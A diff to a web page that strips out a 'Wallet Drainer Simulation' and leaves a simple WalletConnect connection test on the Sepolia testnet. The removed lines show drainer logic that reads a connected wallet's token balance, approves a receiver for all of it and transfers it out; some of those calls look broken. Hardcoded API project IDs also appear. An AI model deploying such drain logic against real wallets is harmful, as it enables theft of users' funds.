@@ -1,107 +1,47 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Wallet Drainer Simulation</title>
-  <script src="https://unpkg.com/viem@2.7.2/dist/viem.umd.js"></script>
+  <meta charset="UTF-8" />
+  <title>WalletConnect v2 Test</title>
   <script src="https://unpkg.com/@walletconnect/ethereum-provider@2.9.4/dist/umd/index.min.js"></script>
-  <style>
-    body { font-family: Arial, sans-serif; background: #111; color: #eee; text-align: center; padding: 40px; }
-    button { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #0f0; border: none; border-radius: 10px; }
-    .log { margin-top: 20px; background: #222; padding: 20px; border-radius: 10px; white-space: pre-wrap; text-align: left; }
-  </style>
+  <script src="https://unpkg.com/viem@2.7.2/dist/viem.umd.js"></script>
 </head>
 <body>
-
-  <h1>Simulated Wallet Drainer</h1>
-  <p>This is a testnet-only simulation. Use a burner wallet!</p>
-  <button onclick="connectWallet()">Connect Wallet</button>
-
-  <div class="log" id="log">Status: Waiting...</div>
+  <button id="connectButton">Connect Wallet</button>
 
   <script>
     const INFURA_PROJECT_ID = "4aa83a1a6d3c4b318c210e38243466c9";
     const WALLETCONNECT_PROJECT_ID = "b49de02b26fcb4c1ad6f4fb0dbd9caff";
-    const TOKEN_ADDRESS = "0xYourTestTokenAddressHere"; // Replace with Sepolia ERC-20 token
-    const RECEIVER_ADDRESS = "0xYourReceiverAddressHere"; // Replace with your receiving address
 
-    const log = msg => {
-      const logEl = document.getElementById('log');
-      logEl.innerText = `Status: ${msg}`;
+    document.getElementById('connectButton').onclick = async () => {
+      console.log("Button clicked!");
+
+      try {
+        const provider = await EthereumProvider.init({
+          projectId: WALLETCONNECT_PROJECT_ID,
+          chains: [11155111], // Sepolia chainId
+          showQrModal: true,
+          rpcMap: {
+            11155111: `https://sepolia.infura.io/v3/${INFURA_PROJECT_ID}`
+          }
+        });
+
+        provider.on("connect", (info) => {
+          console.log("Connected:", info);
+          alert("Wallet connected successfully!");
+        });
+
+        provider.on("disconnect", (error) => {
+          console.log("Disconnected:", error);
+          alert("Wallet disconnected");
+        });
+
+        await provider.enable();
+      } catch (err) {
+        console.error("Error connecting wallet:", err);
+        alert("Failed to connect wallet: " + err.message);
+      }
     };
-
-    let provider;
-    let publicClient;
-
-    async function connectWallet() {
-      log("Initializing WalletConnect...");
-
-      provider = await EthereumProvider.init({
-        projectId: WALLETCONNECT_PROJECT_ID,
-        chains: [11155111], // Sepolia
-        showQrModal: true,
-        rpcMap: { 11155111: `https://sepolia.infura.io/v3/${INFURA_PROJECT_ID}` },
-        methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData'],
-      });
-
-      await provider.enable();
-      log("Wallet connected");
-
-      const account = provider.accounts[0];
-      const chainId = provider.chainId;
-
-      publicClient = viem.createPublicClient({
-        chain: viem.chains.sepolia,
-        transport: viem.custom(provider),
-      });
-
-      await simulateDrain(account);
-    }
-
-    async function simulateDrain(account) {
-      const erc20 = {
-        address: TOKEN_ADDRESS,
-        abi: [
-          "function approve(address spender, uint256 amount) external returns (bool)",
-          "function transferFrom(address from, address to, uint256 amount) external returns (bool)",
-          "function balanceOf(address owner) view returns (uint256)",
-          "function decimals() view returns (uint8)"
-        ]
-      };
-
-      log("Checking balance...");
-      const decimals = await publicClient.readContract({
-        ...erc20,
-        functionName: "decimals"
-      });
-      const balance = await publicClient.readContract({
-        ...erc20,
-        functionName: "balanceOf",
-        args: [account],
-      });
-
-      const maxAmount = balance; // entire balance
-      log(`Balance found: ${balance / 10n ** BigInt(decimals)} tokens`);
-
-      log("Requesting approval...");
-      await publicClient.writeContract({
-        ...erc20,
-        functionName: "approve",
-        args: [RECEIVER_ADDRESS, maxAmount],
-        account,
-      });
-
-      log("Transferring tokens...");
-      await publicClient.writeContract({
-        ...erc20,
-        functionName: "transferFrom",
-        args: [account, RECEIVER_ADDRESS, maxAmount],
-        account,
-      });
-
-      log("Tokens transferred successfully (simulation complete).");
-    }
   </script>
-
 </body>
 </html>
